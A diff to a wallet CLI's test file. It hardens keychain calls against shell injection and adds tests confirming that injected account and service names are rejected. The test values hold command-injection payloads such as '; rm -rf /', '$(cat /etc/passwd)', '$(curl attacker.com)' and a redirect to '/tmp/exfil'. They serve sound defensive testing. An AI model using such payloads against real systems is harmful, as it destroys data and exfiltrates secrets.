@@ -97,10 +97,11 @@ function runWalletAsync(args = [], env = {}) {
 /** Delete the test keychain entry (cleanup) */
 function deleteTestKeychain() {
   try {
-    execSync(
-      `security delete-generic-password -a "${TEST_ACCOUNT}" -s "${TEST_SERVICE}"`,
-      { stdio: "pipe" }
-    );
+    execFileSync("security", [
+      "delete-generic-password",
+      "-a", TEST_ACCOUNT,
+      "-s", TEST_SERVICE
+    ], { stdio: "pipe" });
   } catch {
     // Doesn't exist — fine
   }
@@ -109,27 +110,34 @@ function deleteTestKeychain() {
 /** Store a key in the test keychain slot */
 function storeTestKey(key) {
   try {
-    execSync(
-      `security add-generic-password -a "${TEST_ACCOUNT}" -s "${TEST_SERVICE}" -w "${key}" -U`,
-      { stdio: "pipe" }
-    );
+    execFileSync("security", [
+      "add-generic-password",
+      "-a", TEST_ACCOUNT,
+      "-s", TEST_SERVICE,
+      "-w", key,
+      "-U"
+    ], { stdio: "pipe" });
   } catch {
     // Update failed, try delete + add
     deleteTestKeychain();
-    execSync(
-      `security add-generic-password -a "${TEST_ACCOUNT}" -s "${TEST_SERVICE}" -w "${key}"`,
-      { stdio: "pipe" }
-    );
+    execFileSync("security", [
+      "add-generic-password",
+      "-a", TEST_ACCOUNT,
+      "-s", TEST_SERVICE,
+      "-w", key
+    ], { stdio: "pipe" });
   }
 }
 
 /** Retrieve key from test keychain slot */
 function retrieveTestKey() {
   try {
-    return execSync(
-      `security find-generic-password -a "${TEST_ACCOUNT}" -s "${TEST_SERVICE}" -w`,
-      { stdio: "pipe", encoding: "utf-8" }
-    ).trim();
+    return execFileSync("security", [
+      "find-generic-password",
+      "-a", TEST_ACCOUNT,
+      "-s", TEST_SERVICE,
+      "-w"
+    ], { stdio: "pipe", encoding: "utf-8" }).trim();
   } catch {
     return null;
   }
@@ -407,7 +415,10 @@ describe("everclaw-wallet A1: offline tests", () => {
     });
 
     it("prints the stored private key and address", () => {
-      const { stdout, exitCode } = runWallet(["export-key"]);
+      const { stdout, exitCode } = runWallet(["export-key"], {
+        EVERCLAW_YES: "1",
+        EVERCLAW_ALLOW_EXPORT: "1",
+      });
       assert.equal(exitCode, 0);
       assert.ok(stdout.includes(TEST_PRIVATE_KEY), "should show exact key");
       assert.ok(
@@ -419,7 +430,10 @@ describe("everclaw-wallet A1: offline tests", () => {
 
     it("fails when no wallet exists", () => {
       deleteTestKeychain();
-      const { exitCode } = runWallet(["export-key"]);
+      const { exitCode } = runWallet(["export-key"], {
+        EVERCLAW_YES: "1",
+        EVERCLAW_ALLOW_EXPORT: "1",
+      });
       assert.notEqual(exitCode, 0);
     });
 
@@ -612,7 +626,7 @@ describe("everclaw-wallet A2: RPC-dependent tests", () => {
     it("approves unlimited MOR by default", async () => {
       const mock = await startMockRpc();
       try {
-        const { stdout, exitCode } = await runWalletAsync(["approve"], { EVERCLAW_RPC: mock.url });
+        const { stdout, exitCode } = await runWalletAsync(["approve", "--unlimited"], { EVERCLAW_RPC: mock.url, EVERCLAW_YES: "1" });
         assert.equal(exitCode, 0, `should exit 0, got: ${stdout}`);
         assert.ok(stdout.includes("unlimited"), "should say unlimited");
         assert.ok(stdout.includes("approved") || stdout.includes("Approved"), "should confirm approval");
@@ -628,7 +642,7 @@ describe("everclaw-wallet A2: RPC-dependent tests", () => {
     it("approves a specified MOR amount", async () => {
       const mock = await startMockRpc();
       try {
-        const { stdout, exitCode } = await runWalletAsync(["approve", "50"], { EVERCLAW_RPC: mock.url });
+        const { stdout, exitCode } = await runWalletAsync(["approve", "50"], { EVERCLAW_RPC: mock.url, EVERCLAW_YES: "1" });
         assert.equal(exitCode, 0);
         assert.ok(stdout.includes("50"), "should show specified amount");
         assert.ok(stdout.includes("approved") || stdout.includes("Approved"), "should confirm");
@@ -640,7 +654,7 @@ describe("everclaw-wallet A2: RPC-dependent tests", () => {
     it("reports failure on reverted tx", async () => {
       const mock = await startMockRpc({ shouldRevert: true });
       try {
-        const { stdout, exitCode, stderr } = await runWalletAsync(["approve"], { EVERCLAW_RPC: mock.url });
+        const { stdout, exitCode, stderr } = await runWalletAsync(["approve", "--unlimited"], { EVERCLAW_RPC: mock.url, EVERCLAW_YES: "1" });
         const output = stdout + stderr;
         // Part B fix: waitAndVerify now throws on reverted receipts
         const failed = exitCode !== 0 || output.includes("revert") || output.includes("failed");
@@ -653,9 +667,10 @@ describe("everclaw-wallet A2: RPC-dependent tests", () => {
     it("respects EVERCLAW_MAX_GAS env var", async () => {
       const mock = await startMockRpc();
       try {
-        const { stdout, exitCode } = await runWalletAsync(["approve"], {
+        const { stdout, exitCode } = await runWalletAsync(["approve", "--unlimited"], {
           EVERCLAW_RPC: mock.url,
           EVERCLAW_MAX_GAS: "123456",
+          EVERCLAW_YES: "1",
         });
         assert.equal(exitCode, 0, `should exit 0, got: ${stdout}`);
         // Gas limit is passed to writeContract — we can't verify the exact value
@@ -687,7 +702,7 @@ describe("everclaw-wallet A2: RPC-dependent tests", () => {
       try {
         const { stdout, exitCode } = await runWalletAsync(
           ["swap", "eth", "0.1"],
-          { EVERCLAW_RPC: mock.url }
+          { EVERCLAW_RPC: mock.url, EVERCLAW_YES: "1" }
         );
         assert.equal(exitCode, 0, `should exit 0, got: ${stdout}`);
         assert.ok(
@@ -714,7 +729,7 @@ describe("everclaw-wallet A2: RPC-dependent tests", () => {
       try {
         const { stdout, exitCode } = await runWalletAsync(
           ["swap", "usdc", "100"],
-          { EVERCLAW_RPC: mock.url }
+          { EVERCLAW_RPC: mock.url, EVERCLAW_YES: "1" }
         );
         assert.equal(exitCode, 0, `should exit 0, got: ${stdout}`);
         assert.ok(stdout.includes("Approv"), "should show USDC approval step");
@@ -739,7 +754,7 @@ describe("everclaw-wallet A2: RPC-dependent tests", () => {
       try {
         const { stdout, exitCode, stderr } = await runWalletAsync(
           ["swap", "eth", "0.01"],
-          { EVERCLAW_RPC: mock.url }
+          { EVERCLAW_RPC: mock.url, EVERCLAW_YES: "1" }
         );
         const output = stdout + stderr;
         const failed = exitCode !== 0 || output.includes("fail") || output.includes("revert") || output.includes("❌");
@@ -752,7 +767,7 @@ describe("everclaw-wallet A2: RPC-dependent tests", () => {
     it("ETH swap sends value with transaction", async () => {
       const mock = await startMockRpc();
       try {
-        await runWalletAsync(["swap", "eth", "0.05"], { EVERCLAW_RPC: mock.url });
+        await runWalletAsync(["swap", "eth", "0.05"], { EVERCLAW_RPC: mock.url, EVERCLAW_YES: "1" });
 
         // Verify the mock received a sendRawTransaction
         const sendCalls = mock.calls.filter((c) => c.method === "eth_sendRawTransaction");
@@ -765,7 +780,7 @@ describe("everclaw-wallet A2: RPC-dependent tests", () => {
     it("USDC swap does not send ETH value", async () => {
       const mock = await startMockRpc();
       try {
-        await runWalletAsync(["swap", "usdc", "50"], { EVERCLAW_RPC: mock.url });
+        await runWalletAsync(["swap", "usdc", "50"], { EVERCLAW_RPC: mock.url, EVERCLAW_YES: "1" });
 
         // At minimum: approve tx + swap tx
         const sendCalls = mock.calls.filter((c) => c.method === "eth_sendRawTransaction");
@@ -783,6 +798,7 @@ describe("everclaw-wallet A2: RPC-dependent tests", () => {
         // Default slippage is 100 bps = 1%
         const { stdout, exitCode } = await runWalletAsync(["swap", "eth", "0.01"], {
           EVERCLAW_RPC: mock.url,
+          EVERCLAW_YES: "1",
         });
         assert.equal(exitCode, 0, `should exit 0, got: ${stdout}`);
         // Slippage is applied internally — we verify the swap succeeds
@@ -797,6 +813,7 @@ describe("everclaw-wallet A2: RPC-dependent tests", () => {
         const { stdout, exitCode } = await runWalletAsync(["swap", "eth", "0.01"], {
           EVERCLAW_RPC: mock.url,
           EVERCLAW_SLIPPAGE_BPS: "500", // 5% slippage
+          EVERCLAW_YES: "1",
         });
         assert.equal(exitCode, 0, `should exit 0, got: ${stdout}`);
         // The slippage value is used in applySlippage() — mock can't verify exact value
@@ -834,6 +851,7 @@ describe("everclaw-wallet A2: RPC-dependent tests", () => {
     it("swap fails gracefully when RPC is unreachable", async () => {
       const { exitCode, stderr } = await runWalletAsync(["swap", "eth", "0.01"], {
         EVERCLAW_RPC: "http://127.0.0.1:19999",
+        EVERCLAW_YES: "1",
       });
       const output = stderr;
       const failed = exitCode !== 0 || output.includes("fail") || output.includes("Error");
@@ -841,12 +859,209 @@ describe("everclaw-wallet A2: RPC-dependent tests", () => {
     });
 
     it("approve fails gracefully when RPC is unreachable", async () => {
-      const { exitCode, stderr } = await runWalletAsync(["approve"], {
+      const { exitCode, stderr } = await runWalletAsync(["approve", "--unlimited"], {
         EVERCLAW_RPC: "http://127.0.0.1:19999",
+        EVERCLAW_YES: "1",
       });
       const output = stderr;
       const failed = exitCode !== 0 || output.includes("fail") || output.includes("Error");
       assert.ok(failed, "should fail when RPC is unreachable");
+    });
+  });
+});
+
+// ============================================================
+// A3: Shell injection prevention tests (Issue #10 / #11)
+// ============================================================
+
+describe("everclaw-wallet A3: shell injection prevention", () => {
+  // These tests verify that KEYCHAIN_ACCOUNT and KEYCHAIN_SERVICE
+  // env vars are validated before being used in any shell command.
+
+  // --------------------------------------------------------
+  // 12. sanitizeKeychainParam rejects injection payloads
+  // --------------------------------------------------------
+  describe("KEYCHAIN_ACCOUNT injection", () => {
+    it("rejects semicolon-based command injection", () => {
+      const { exitCode, stderr } = runWallet(["address"], {
+        EVERCLAW_KEYCHAIN_ACCOUNT: "; rm -rf /; echo ",
+      });
+      assert.notEqual(exitCode, 0, "should reject injected account name");
+      assert.ok(
+        stderr.includes("invalid characters") || stderr.includes("EVERCLAW_KEYCHAIN_ACCOUNT"),
+        `should mention invalid characters, got: ${stderr.slice(0, 200)}`
+      );
+    });
+
+    it("rejects backtick-based command substitution", () => {
+      const { exitCode, stderr } = runWallet(["address"], {
+        EVERCLAW_KEYCHAIN_ACCOUNT: "`whoami`",
+      });
+      assert.notEqual(exitCode, 0, "should reject backtick injection");
+    });
+
+    it("rejects $() command substitution", () => {
+      const { exitCode, stderr } = runWallet(["address"], {
+        EVERCLAW_KEYCHAIN_ACCOUNT: "$(cat /etc/passwd)",
+      });
+      assert.notEqual(exitCode, 0, "should reject $() injection");
+    });
+
+    it("rejects pipe injection", () => {
+      const { exitCode, stderr } = runWallet(["address"], {
+        EVERCLAW_KEYCHAIN_ACCOUNT: "safe | malicious",
+      });
+      assert.notEqual(exitCode, 0, "should reject pipe character");
+    });
+
+    it("rejects newline injection", () => {
+      const { exitCode, stderr } = runWallet(["address"], {
+        EVERCLAW_KEYCHAIN_ACCOUNT: "safe\nmalicious",
+      });
+      assert.notEqual(exitCode, 0, "should reject newline injection");
+    });
+
+    it("rejects ampersand-based background execution", () => {
+      const { exitCode, stderr } = runWallet(["address"], {
+        EVERCLAW_KEYCHAIN_ACCOUNT: "safe & malicious &",
+      });
+      assert.notEqual(exitCode, 0, "should reject ampersand injection");
+    });
+
+    it("rejects single-quote breakout", () => {
+      const { exitCode, stderr } = runWallet(["address"], {
+        EVERCLAW_KEYCHAIN_ACCOUNT: "safe'; malicious #",
+      });
+      assert.notEqual(exitCode, 0, "should reject quote breakout");
+    });
+
+    it("rejects double-quote breakout", () => {
+      const { exitCode, stderr } = runWallet(["address"], {
+        EVERCLAW_KEYCHAIN_ACCOUNT: 'safe"; malicious #',
+      });
+      assert.notEqual(exitCode, 0, "should reject double-quote breakout");
+    });
+  });
+
+  describe("KEYCHAIN_SERVICE injection", () => {
+    it("rejects semicolon-based command injection", () => {
+      const { exitCode, stderr } = runWallet(["address"], {
+        EVERCLAW_KEYCHAIN_SERVICE: "; rm -rf /; echo ",
+      });
+      assert.notEqual(exitCode, 0, "should reject injected service name");
+      assert.ok(
+        stderr.includes("invalid characters") || stderr.includes("EVERCLAW_KEYCHAIN_SERVICE"),
+        `should mention invalid characters, got: ${stderr.slice(0, 200)}`
+      );
+    });
+
+    it("rejects $() command substitution", () => {
+      const { exitCode, stderr } = runWallet(["address"], {
+        EVERCLAW_KEYCHAIN_SERVICE: "$(curl attacker.com)",
+      });
+      assert.notEqual(exitCode, 0, "should reject $() in service");
+    });
+
+    it("rejects redirect injection", () => {
+      const { exitCode, stderr } = runWallet(["address"], {
+        EVERCLAW_KEYCHAIN_SERVICE: "safe > /tmp/exfil",
+      });
+      assert.notEqual(exitCode, 0, "should reject redirect character");
+    });
+  });
+
+  // --------------------------------------------------------
+  // 13. sanitizeKeychainParam accepts valid values
+  // --------------------------------------------------------
+  describe("valid keychain parameter values", () => {
+    it("accepts default value 'everclaw-agent'", () => {
+      // Default values should work (this implicitly tests every normal run)
+      const { exitCode } = runWallet([]);
+      assert.equal(exitCode, 0, "default values should be accepted");
+    });
+
+    it("accepts alphanumeric with hyphens", () => {
+      const { exitCode } = runWallet([], {
+        EVERCLAW_KEYCHAIN_ACCOUNT: "my-custom-agent-2",
+        EVERCLAW_KEYCHAIN_SERVICE: "custom-wallet-service-v3",
+      });
+      assert.equal(exitCode, 0, "alphanumeric + hyphens should be valid");
+    });
+
+    it("accepts dots and underscores", () => {
+      const { exitCode } = runWallet([], {
+        EVERCLAW_KEYCHAIN_ACCOUNT: "agent.v2_test",
+        EVERCLAW_KEYCHAIN_SERVICE: "wallet.key_store.v1",
+      });
+      assert.equal(exitCode, 0, "dots and underscores should be valid");
+    });
+
+    it("falls back to default when KEYCHAIN_ACCOUNT is empty string", () => {
+      // Empty string triggers || fallback to "everclaw-agent" default,
+      // so the script should still run normally (help output)
+      const { exitCode } = runWallet([], {
+        EVERCLAW_KEYCHAIN_ACCOUNT: "",
+      });
+      assert.equal(exitCode, 0, "empty string should fall back to default");
+    });
+  });
+
+  // --------------------------------------------------------
+  // 14. Combined ACCOUNT + SERVICE injection
+  // --------------------------------------------------------
+  describe("combined parameter injection", () => {
+    it("rejects when both parameters contain injection payloads", () => {
+      const { exitCode } = runWallet(["address"], {
+        EVERCLAW_KEYCHAIN_ACCOUNT: "; echo pwned",
+        EVERCLAW_KEYCHAIN_SERVICE: "$(id)",
+      });
+      assert.notEqual(exitCode, 0, "should reject when both params are malicious");
+    });
+
+    it("rejects when only one parameter is malicious", () => {
+      // Valid account, malicious service
+      const { exitCode: e1 } = runWallet(["address"], {
+        EVERCLAW_KEYCHAIN_ACCOUNT: "safe-agent",
+        EVERCLAW_KEYCHAIN_SERVICE: "; whoami",
+      });
+      assert.notEqual(e1, 0, "should reject malicious service even with safe account");
+
+      // Malicious account, valid service
+      const { exitCode: e2 } = runWallet(["address"], {
+        EVERCLAW_KEYCHAIN_ACCOUNT: "$(id)",
+        EVERCLAW_KEYCHAIN_SERVICE: "safe-service",
+      });
+      assert.notEqual(e2, 0, "should reject malicious account even with safe service");
+    });
+  });
+
+  // --------------------------------------------------------
+  // 15. Functional verification: keychain ops still work after hardening
+  // --------------------------------------------------------
+  describe("post-hardening functional check", () => {
+    before(() => deleteTestKeychain());
+    after(() => deleteTestKeychain());
+
+    it("setup + address round-trip works with safe params", () => {
+      const { exitCode: setupExit } = runWallet(["setup"]);
+      assert.equal(setupExit, 0, "setup should succeed");
+
+      const { stdout, exitCode: addrExit } = runWallet(["address"]);
+      assert.equal(addrExit, 0, "address should succeed");
+      assert.ok(stdout.includes("0x"), "should output a valid address");
+    });
+
+    it("import + export round-trip works with safe params", () => {
+      deleteTestKeychain();
+      const { exitCode: impExit } = runWallet(["import-key", TEST_PRIVATE_KEY]);
+      assert.equal(impExit, 0, "import should succeed");
+
+      const { stdout, exitCode: expExit } = runWallet(["export-key"], {
+        EVERCLAW_YES: "1",
+        EVERCLAW_ALLOW_EXPORT: "1",
+      });
+      assert.equal(expExit, 0, "export should succeed");
+      assert.ok(stdout.includes(TEST_PRIVATE_KEY), "should return the imported key");
     });
   });
 });
